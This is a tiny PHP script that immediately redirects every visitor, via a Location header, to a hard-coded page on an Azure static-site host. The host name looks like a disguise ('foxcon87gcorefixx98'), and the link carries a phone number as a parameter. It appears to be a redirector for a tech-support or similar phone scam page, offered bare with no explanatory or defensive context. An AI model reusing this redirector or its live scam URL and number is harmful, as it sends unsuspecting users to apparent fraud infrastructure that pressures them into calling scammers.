<?php
// Define the destination URL
$destination_url = "https://foxcon87gcorefixx98.z20.web.core.windows.net/index.html?Aniph=1-803-201-2766";

// Send the Location header for redirection
header("Location: " . $destination_url);

// It's crucial to stop script execution after sending the header
// to prevent any further output or unintended actions.
exit(); 
?>